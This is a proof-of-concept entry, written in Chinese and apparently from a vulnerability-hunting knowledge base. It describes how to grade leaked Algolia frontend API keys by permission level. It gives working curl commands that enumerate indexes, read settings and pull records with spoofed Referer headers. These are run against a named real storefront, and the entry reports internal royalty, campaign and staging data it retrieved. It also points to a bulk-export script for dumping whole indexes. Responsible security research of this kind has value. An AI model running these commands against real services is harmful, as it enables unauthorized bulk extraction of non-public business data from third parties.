# Algolia 前端泄露 key 的 ACL 分级判定与可读数据面验证（listIndexes+settings 200 仍可能是非 admin）

- **code**: algolia-frontend-key-acl-ladder-listindexes-settings-non-adm
- **kind**: poc
- **category**: info-leak
- **component**: Algolia（搜索 SaaS）
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: finding_id=177（task#6，finding_checks.verdict=verified，status=confirmed）。2026-11-11 21:50–22:04 UTC 本机 curl 直连 https://sczizsp09z-dsn.algolia.net：GET /1/indexes → 200 items=5346（1,729,472B）；GET /1/keys → 403 Invalid Application-ID or API key；GET prod/staging/dev settings → 均 200（unretrievableAttributes=null、attributesToRetrieve=null、paginationLimitedTo=1000）；POST prod_ProductSearch_US/query → 200 nbHits=13599，hit[0].RoyaltyCode=550043/BestSellingRank=5/CampaignName=["NC_GMG_XP_02SEP26","base_price"]/UpdatedBy=ProductIndexing；POST staging_ProductSearch_US_Mrp_ASC/query → 200 nbHits=4043（样本 Life of Pixel 等，官网已 302→/title-no-longer-available/ 或 404）；缺 Referer → 403 Method not allowed with this referer；browse → 403 Method not allowed with this API key。证明前端 key 具备 listIndexes+settings 读仍非 admin，但可匿名批量读取内部商业字段与 staging 数据。
- **path**: pocs/algolia-frontend-key-acl-ladder-listindexes-settings-non-adm/poc.md
- **tags**: algolia,saas,api-key,frontend-leak,acl,listindexes,settings,referer,info-leak,staging-index
- **created_at**: 2026-11-11T22:04:25.137Z
- **engine**: www.greenmangaming.com / sczizsp09z-dsn.algolia.net

## 描述

Algolia 前端内联 key 的只读权限阶梯判定：listIndexes/settings 返回 200、/1/keys 返回 403 时仍属非 admin，但若索引 unretrievableAttributes=null，则可匿名枚举全部索引并批量读取内部商业字段与 staging（下架/测试）数据。用于快速区分「纯 search-only 受限 key（低危）」与「权限过剩可批量导出（中危）」，并界定能否升级为写/控制。

## 用法

```
适用：前端 JS/HTML 泄露 Algolia App ID + 32hex key（非 base64 secured key）时的只读分级验证。步骤：①GET /1/isalive 判活；②GET /1/indexes 判 listIndexes（200=可枚举全部索引）；③GET /1/indexes/{index}/settings 判 settings 读；④GET /1/keys 判 admin（403=非 admin）；⑤POST /1/indexes/{index}/query 抽样判数据与字段；⑥缺 Referer 对照判是否仅 Referer 门禁。全程只读，不做写/删/改配置。若确认 attributesToRetrieve 无限制，再走 kb#723 的 alg_export.py 做全量导出。

```bash
APP=<APPID>; KEY=<key>; BASE=https://$APP-dsn.algolia.net
H=(-H "X-Algolia-Application-Id: $APP" -H "X-Algolia-API-Key: $KEY" -H "Referer: https://<target>/")
curl -s "${H[@]}" $BASE/1/isalive
curl -s "${H[@]}" $BASE/1/indexes -o idx.json -w '%{http_code} %{size_download}\n'
curl -s "${H[@]}" $BASE/1/indexes/<index>/settings
curl -s "${H[@]}" $BASE/1/keys
curl -s -X POST "${H[@]}" -H 'Content-Type: application/json' --data '{"params":"query=&hitsPerPage=2&attributesToRetrieve=*"}' $BASE/1/indexes/<index>/query
# 对照：去掉 -H Referer 再打 /1/indexes
```
判据：indexes 200 + settings 200 + keys 403 ⇒ 非 admin 但权限过剩（listIndexes+settings 读），可枚举内部索引并批量读取字段；若 indexes 403 且 settings 403 ⇒ 纯 search-only/受限 key（参考 kb 534）。坑：前端 key 可能仅靠 Referer 头限制，任意客户端可伪造；query 单请求最多 1000 条（paginationLimitedTo），可按 filter/facet 切片（见 kb#723）；务必不做写操作。
```

## 正文

```
# Algolia 前端 key ACL 分级判定（实测：listIndexes+settings 200 仍非 admin）

## 结论
首页内联的 Algolia App ID + 32hex key 若无 secured key 的 restrictIndices 限制，常见权限阶梯如下（本靶标实测）：

| 探测 | 端点 | 本靶标结果 | 含义 |
|---|---|---|---|
| 存活 | GET /1/isalive | 200 | key 有效 |
| 列索引 | GET /1/indexes | 200，items=5346 | 有 listIndexes，可枚举全部索引名/条数 |
| 读配置 | GET /1/indexes/{index}/settings | 200 | 有 settings 读权限；unretrievableAttributes=null 时无字段级保护 |
| key 管理 | GET /1/keys | 403 Invalid Application-ID or API key | 非 admin key |
| 跨索引读 | POST /1/indexes/{index}/query | 200 | search 权限覆盖所有未受限索引 |
| Referer 门禁 | GET /1/indexes（无 Referer） | 403 Method not allowed with this referer | 仅头校验，可伪造 |

本靶标规模：5346 索引（prod 2666 / staging 2672 / dev 8），37,879,778 条，fileSize 12.67GB；prod 索引单请求 1000 条可读 RoyaltyCode/CampaignName/BestSellingRank/UpdatedBy/objectID（含分发商 ZTORM 代号）；staging 索引存有官网已下架/测试商品。

## 本靶标数据面量化（finding 177 / task#6 证据）
- 索引清单 1,729,472B / items=5346：其中 staging_ProductSearch_* 2,672 个，另有 dev_ProductSearch、dev_QuickSearch、Neelam_Yangal_dev_ProductSearch、bensc_dev_ProductSearch 等个人名/开发索引。
- settings（prod_ProductSearch_US）：unretrievableAttributes=null、attributesToRetrieve=null；attributesForFaceting 含 filterOnly(IsSellable)/filterOnly(CampaignName)/filterOnly(SteamAppId)/filterOnly(ExcludeCountryCodes)；paginationLimitedTo=1000。
- 单请求 1,000 条（hitsPerPage=1000）取回 prod_ProductSearch_US（nbHits=13,599）内部字段：hit[0] RoyaltyCode="550043"、BestSellingRank=5、CampaignName=["NC_GMG_XP_02SEP26","base_price"]、UpdatedBy="ProductIndexing"、ProviderName="CatalogContent"、objectID="The Blood of Dawnwalker ZTORM - PC"。
- staging_ProductSearch_US_Mrp_ASC：nbHits=4,043，attributesToRetrieve=* 可读；样本 "Life of Pixel"、"Herod's Lost Tomb"、"A Game of Thrones - Genesis"、"Ewan Image Resizer"、"RedSpec Prices Basic Product"；独有字段 RelatedVariants/ShowMoreDrms。
- 下架/测试数据判定对照：GET /games/life-of-pixel/ → 302 location: /title-no-longer-available/?query=Life of Pixel；/games/ewan-image-resizer/ → 404；公开商品页 /games/the-blood-of-dawnwalker-pc/ 中 RoyaltyCode 出现 0 次。
- ACL 边界：GET /1/keys → 403 Invalid Application-ID or API key；GET /1/indexes/{index}/browse?params=query%3D → 403 Method not allowed with this API key。
- 全量导出能力见 kb#723（alg_export.py）：5 个索引合计 22,110 条 100% 导出、77MB，与 nbHits 完全一致。

## 验证命令
（见 usage 字段）

## 判据
- indexes 200 + settings 200 + keys 403 ⇒ 非 admin 但权限过剩，属可匿名批量读取的非公开数据暴露；
- indexes 403 + settings 403 ⇒ 纯 search-only/受限 key（参见 kb 534 的 secured key 案例，低危）；
- browse 403 不影响判断（browse 是独立 ACL）。

## 坑
1. 前端 key 可能仅靠 Referer/Origin 限制，任意客户端可伪造；
2. 单查询最多 1000 条（paginationLimitedTo=1000），需按 filter/facet 切片枚举；
3. 不要做写/删/改配置验证；用 /1/keys 403 与 browse 403 即可界定非 admin；
4. staging/dev 索引常含已下架、测试、未发布数据，优先检查这些索引；
5. Algolia 响应字段可能包含 RoyaltyCode（版税）、CampaignName（活动）、UpdatedBy（内部更新者）、objectID（分发商代号）等公开页不出现的商业字段；
6. 判定「非公开」要给对照证据：同一字段在公开商品页出现 0 次，且对应商品 URL 已 302→下架页或 404。
```
